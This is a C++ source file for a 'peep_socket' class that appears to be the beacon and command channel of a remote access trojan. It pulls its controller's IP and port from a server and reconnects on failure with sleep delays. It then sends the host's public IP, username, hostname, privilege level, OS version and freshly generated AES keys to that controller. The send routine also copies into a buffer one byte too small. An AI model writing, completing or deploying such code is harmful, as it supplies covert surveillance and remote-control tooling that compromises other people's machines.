#include "peep_socket.h"
#include "analyze.h"
#include "protocol.h"

/*STRCPY*/
#pragma warning(disable:4996)


peep_socket::peep_socket(): tcp_socket(NULL, NULL){

}

int peep_socket::create_set_sock(){
    if (init_socket() != 0){return -1;}

    setting_sock["key_sock"]    = random_ascii(32);
    setting_sock["key_aes"]     = random_ascii(32);
    setting_sock["key_iv"]      = random_ascii(16);
    setting_sock["xor"]         = new_key_xor();
    PACKET_T_PROTOCOL["xor"]    = setting_sock["xor"];
    setting_sock["timeout"]     = 30;

    return 0;
}

int peep_socket::connect(int error){
    if (create_set_sock()!=0){return -1;}

    if (error != 110){
        sleep(10);
    }

    
    if (!set_setting()){
        sleep(20);
        return 110;
    }

    string __ip = setting_sock["ip"];
    string __p = to_string(setting_sock["port"]);
    return this->open_socket(__ip.c_str(), stoi(__p));
}


void peep_socket::send_protocol(){
    PACKET_T_PROTOCOL["ip"]         = get_public_ip();
    PACKET_T_PROTOCOL["user"]       = getlogin();
    PACKET_T_PROTOCOL["port"]       = setting_sock["port"];
    PACKET_T_PROTOCOL["key_sock"]   = setting_sock["key_sock"];
    PACKET_T_PROTOCOL["hostname"]   = t_gethostname();
    PACKET_T_PROTOCOL["priv"]       = is_elevated_access();
    PACKET_T_PROTOCOL["set_recv"]   = setting_sock["recv"];
    PACKET_T_PROTOCOL["versionos"]  = get_platform_name();
    PACKET_T_PROTOCOL["key_aes"]    = setting_sock["key_aes"];
    PACKET_T_PROTOCOL["key_aes_iv"] = setting_sock["key_iv"];
    string str_packet = B2Hex::b2a_hex(PACKET_T_PROTOCOL.dump());
    // set c style string
    char* c_packet = new char[str_packet.length()];
    // copy from source
    strcpy(c_packet, str_packet.c_str());
    // send to server
    this->send_packet(c_packet, str_packet.length());
    // cleanup 
    delete[] c_packet;
}


bool peep_socket::set_setting() {
    json res = get_setting_from_server();
    if (res["error"]) {
        return false;
    }

    setting_sock["ip"]      = res["ip"];
    setting_sock["port"]    = res["port"];
    setting_sock["recv"]    = res["recv"];
    return true;
}


pair<json, char*> peep_socket::get_packet_p() {

    list<pair<size_t, char*>> binary;
    size_t lpacket = 0;
    try {
        binary = this->get_packet(lpacket);
        // empty packet
        if (binary.size() == 0 || lpacket>MAX_LEN_PROTO ) {
            deallocate_receive_proto(binary);
            return BLOCK_ERROR;
        }
    }
    catch (exception&err) {
        return BLOCK_ERROR;
    }
    // following protocol: get packet from binary
    char* packet = concatenate_to_char_ptr(binary, lpacket);
    return GetBlockPacket(packet, lpacket);

}

void peep_socket::send_packet_p(char* packet, size_t lpacket) {
    this->send_packet(packet, lpacket);
}
void peep_socket::peep_cleanup() {
    this->ts_cleanup();
    // revalue
    setting_sock = R"({"timeout": 10})"_json;
}

